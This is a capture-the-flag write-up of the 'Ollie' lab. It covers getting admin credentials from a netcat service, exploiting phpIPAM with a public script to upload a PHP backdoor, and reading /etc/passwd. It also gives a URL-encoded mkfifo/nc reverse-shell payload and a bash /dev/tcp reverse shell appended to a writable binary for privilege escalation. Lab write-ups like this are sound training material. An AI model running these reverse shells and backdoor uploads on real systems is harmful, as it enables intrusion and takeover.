Meet the world's most powerful hacker dog!
Ollie Unix Montgomery, the infamous hacker dog, is a great red teamer. As for development... not so much! Rumor has it, Ollie messed with a few of the files on the server to ensure backward compatibility. Take control before time runs out!

  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e3595f110c4674ba9f80e7a/room-content/9e73c99868e94dfa12783f95a1af0178.jpg)

js/dieIE.js

```javascript
/**
 *
 * Die IF IE 6 and 7
 *
 *
 */

$(document).ready(function () {

//set text
var html;
html  = "<strong>phpIPAM only works on newer browsers!</strong><br>Please use at least IE9, IE10 is recommended (if you have to use IE :/)<hr>You can get browsers here:";
html += "<ul>";
html += "<li><a href='https://www.google.com/intl/en/chrome/browser/' alt='chrome' target='self'>Google chrome</a></li>";
html += "<li><a href='http://www.mozilla.org/en-US/firefox/new/' alt='chrome' target='self'>Firefox</a></li>";
html += "<li><a href='http://www.apple.com/safari/' alt='chrome' target='self'>Safari</a></li>";

html += "</ul>";

$('body').css('overflow','hidden');
$('div.jqueryError').addClass('dieIE').html('<div class="alert alert-danger">'+html+'</div>').show();

return false;
});
```

nc 10.114.185.135 1337
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name? arch
What's up, Arch! It's been a while. What are you here for? info
Ya' know what? Arch. If you can answer a question about me, I might have something for you.


What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? bulldog
You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
Please hold on a minute
Ok, I'm back.
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.

                    Username: admin

                    Password: OllieUnixMontgomery!

PS: Good luck and next time bring some treats!

Next, clone github repo and exploit

![](https://miro.medium.com/v2/resize:fit:1000/1*tqWo47SMOPeTF5ILzGNhhA.png)

python3 50963.py -url http://10.114.185.135 -usr admin -pwd OllieUnixMontgomery! -cmd 'id'

The php backdoor is uploaded on the server

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*PgAcLL1eMeJBu3dZS4F9wQ.png)

evil.php RCE

I can also fetch /etc/passwd, as we can see ‘ollie’ is present as a user

ollie:x:1000:1000:ollie unix montgomery:/home/ollie:/bin/bash

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*1Q2hAa4at5-2A8DOzEoE8w.png)

Now getting a reverse shell is easy, open a listener on our machine.

I use a web based reverse shell

cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|sh%20-i%202%3E%261|nc%20[Attacker-ip]%20[Attacker-port]%20%3E%2Ftmp%2Ff

![](https://miro.medium.com/v2/resize:fit:700/1*iDSRd2oputfXpvzsMk3HWA.png)

We got the reverse shell

I try switching to ollie, using the same credentials we got from netcat at port 1337

![](https://miro.medium.com/v2/resize:fit:473/1*lF5cJKwzIfpwKAB2JTvEhg.png)

Got user.txt
I tried to find writable files, I ended up finding a very suspicious file: /usr/bin/feedme

find / -writable -type f 2>/dev/null/

I added a reverse shell in feedme

echo 'bash -i >& /dev/tcp/192.168.158.93/1234 0>&1' >> /usr/bin/feedme

